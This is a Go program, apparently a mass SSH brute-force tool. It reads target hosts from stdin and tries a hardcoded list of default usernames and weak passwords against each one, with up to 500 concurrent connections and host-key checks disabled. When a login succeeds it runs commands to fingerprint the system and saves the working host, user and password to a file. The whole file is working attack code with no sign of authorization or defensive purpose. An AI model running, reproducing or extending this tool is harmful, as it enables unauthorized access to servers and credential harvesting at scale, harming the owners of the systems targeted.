package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	maxConcurrentConnections = 500
	connectionTimeout        = 10 * time.Second
	sshCommandTimeout        = 5 * time.Second
	outputFileName           = "data.txt"
)

var (
	// Counters for statistics
	totalAttempts    int64
	successfulLogins int64
	failedAttempts   int64

	// Predefined credentials
	users     = []string{"root", "ubuntu", "centos", "admin", "administrator"}
	passwords = []string{
		"password", "123456789", "12345678", "1234567", "1234567890",
		"admin", "admin123", "admin@123", "root", "ubuntu", "centos",
		"test", "test123", "qwerty", "password123", "123123", "abc123",
	}

	// Synchronization primitives
	fileWriter    *SafeFileWriter
	connSemaphore = make(chan struct{}, maxConcurrentConnections)
)

// SafeFileWriter provides thread-safe file writing operations
type SafeFileWriter struct {
	mu       sync.Mutex
	filename string
	file     *os.File
}

// NewSafeFileWriter creates a new SafeFileWriter instance
func NewSafeFileWriter(filename string) (*SafeFileWriter, error) {
	file, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return nil, err
	}
	return &SafeFileWriter{
		filename: filename,
		file:     file,
	}, nil
}

// Write safely writes data to the file
func (sfw *SafeFileWriter) Write(data string) error {
	sfw.mu.Lock()
	defer sfw.mu.Unlock()
	_, err := sfw.file.WriteString(data)
	if err == nil {
		sfw.file.Sync() // Force write to disk
	}
	return err
}

// Close closes the file safely
func (sfw *SafeFileWriter) Close() error {
	sfw.mu.Lock()
	defer sfw.mu.Unlock()
	return sfw.file.Close()
}

// LoginResult represents the result of a login attempt
type LoginResult struct {
	Host       string
	User       string
	Password   string
	Success    bool
	SystemInfo string
	Error      error
}

// SSHClient represents an optimized SSH client
type SSHClient struct {
	timeout time.Duration
}

// NewSSHClient creates a new SSH client with optimized settings
func NewSSHClient() *SSHClient {
	return &SSHClient{
		timeout: connectionTimeout,
	}
}

// TryLogin attempts to login to a host with given credentials
func (c *SSHClient) TryLogin(ctx context.Context, host, user, password string) *LoginResult {
	result := &LoginResult{
		Host:     host,
		User:     user,
		Password: password,
		Success:  false,
	}

	// Acquire semaphore to limit concurrent connections
	select {
	case connSemaphore <- struct{}{}:
		defer func() { <-connSemaphore }()
	case <-ctx.Done():
		result.Error = ctx.Err()
		return result
	}

	atomic.AddInt64(&totalAttempts, 1)

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         c.timeout,
	}

	conn, err := ssh.Dial("tcp", host, config)
	if err != nil {
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = err
		return result
	}
	defer conn.Close()

	// Create session with timeout
	session, err := conn.NewSession()
	if err != nil {
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = err
		return result
	}
	defer session.Close()

	// Set up command timeout
	done := make(chan bool, 1)
	var output []byte
	var cmdErr error

	go func() {
		output, cmdErr = session.CombinedOutput(`uname -a && echo "====" && cat /etc/os-release 2>/dev/null || echo "No OS info available"`)
		done <- true
	}()

	select {
	case <-done:
		if cmdErr != nil {
			atomic.AddInt64(&failedAttempts, 1)
			result.Error = cmdErr
			return result
		}
	case <-time.After(sshCommandTimeout):
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = fmt.Errorf("command timeout")
		return result
	case <-ctx.Done():
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = ctx.Err()
		return result
	}

	outputStr := strings.TrimSpace(string(output))
	parts := strings.Split(outputStr, "====")

	// Validate output - should have system info
	if len(parts) < 2 || len(strings.TrimSpace(parts[1])) == 0 {
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = fmt.Errorf("invalid system information")
		return result
	}

	// Success case
	atomic.AddInt64(&successfulLogins, 1)
	result.Success = true
	result.SystemInfo = outputStr

	// Log success
	fmt.Printf("[✔] Success: %s@%s:%s\n", user, host, password)
	fmt.Printf("→ System Info:\n%s\n", outputStr)
	fmt.Println(strings.Repeat("-", 50))

	// Write to file
	if fileWriter != nil {
		data := fmt.Sprintf("%s:%s:%s\n", host, user, password)
		if err := fileWriter.Write(data); err != nil {
			log.Printf("Failed to write to file: %v", err)
		}
	}

	return result
}

// Worker processes targets from a channel
func processTargets(ctx context.Context, targets <-chan string, results chan<- *LoginResult, wg *sync.WaitGroup) {
	defer wg.Done()

	client := NewSSHClient()

	for target := range targets {
		select {
		case <-ctx.Done():
			return
		default:
		} // Try all credential combinations for this target
		for _, user := range users {
			for _, password := range passwords {
				result := client.TryLogin(ctx, target, user, password)

				select {
				case results <- result:
				case <-ctx.Done():
					return
				}

				if result.Success {
					goto nextTarget
				}
			}
		}
	nextTarget:
	}
}

// printStats prints current statistics
func printStats() {
	total := atomic.LoadInt64(&totalAttempts)
	success := atomic.LoadInt64(&successfulLogins)
	failed := atomic.LoadInt64(&failedAttempts)

	fmt.Printf("\n=== Statistics ===\n")
	fmt.Printf("Total attempts: %d\n", total)
	fmt.Printf("Successful logins: %d\n", success)
	fmt.Printf("Failed attempts: %d\n", failed)
	if total > 0 {
		fmt.Printf("Success rate: %.2f%%\n", float64(success)/float64(total)*100)
	}
	fmt.Println(strings.Repeat("=", 20))
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./ssh_scanner <port | listen>")
		fmt.Println("Examples:")
		fmt.Println("  ./ssh_scanner 22")
		fmt.Println("  ./ssh_scanner listen")
		return
	}

	// Initialize file writer
	var err error
	fileWriter, err = NewSafeFileWriter(outputFileName)
	if err != nil {
		log.Fatalf("Failed to create file writer: %v", err)
	}
	defer fileWriter.Close()

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Create channels
	targets := make(chan string, 100)
	results := make(chan *LoginResult, 100)

	// Start worker goroutines
	const numWorkers = 10
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go processTargets(ctx, targets, results, &wg)
	}

	// Start result collector
	go func() {
		for result := range results {
			if result.Error != nil && result.Error != context.Canceled {
				// Only log significant errors, not normal auth failures
				if !strings.Contains(result.Error.Error(), "auth") &&
					!strings.Contains(result.Error.Error(), "connection refused") {
					log.Printf("Error for %s@%s: %v", result.User, result.Host, result.Error)
				}
			}
		}
	}()

	// Start statistics printer
	statsTicker := time.NewTicker(30 * time.Second)
	defer statsTicker.Stop()
	go func() {
		for {
			select {
			case <-statsTicker.C:
				printStats()
			case <-ctx.Done():
				return
			}
		}
	}()

	fmt.Println("SSH Scanner started. Reading targets from stdin...")
	fmt.Printf("Max concurrent connections: %d\n", maxConcurrentConnections)
	fmt.Printf("Connection timeout: %v\n", connectionTimeout)
	fmt.Println(strings.Repeat("-", 50))
	// Read targets from stdin
	scanner := bufio.NewScanner(os.Stdin)
	targetCount := 0

readLoop:
	for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
		if target == "" {
			continue
		}

		var fullTarget string
		if os.Args[1] == "listen" {
			fullTarget = target
		} else {
			fullTarget = target + ":" + os.Args[1]
		}

		select {
		case targets <- fullTarget:
			targetCount++
			if targetCount%100 == 0 {
				fmt.Printf("Queued %d targets...\n", targetCount)
			}
		case <-ctx.Done():
			break readLoop
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Error reading input: %v", err)
	}

	fmt.Printf("Finished reading %d targets. Processing...\n", targetCount)

	// Close targets channel and wait for workers to finish
	close(targets)
	wg.Wait()
	close(results)

	// Print final statistics
	printStats()
	fmt.Println("Scan completed!")
}
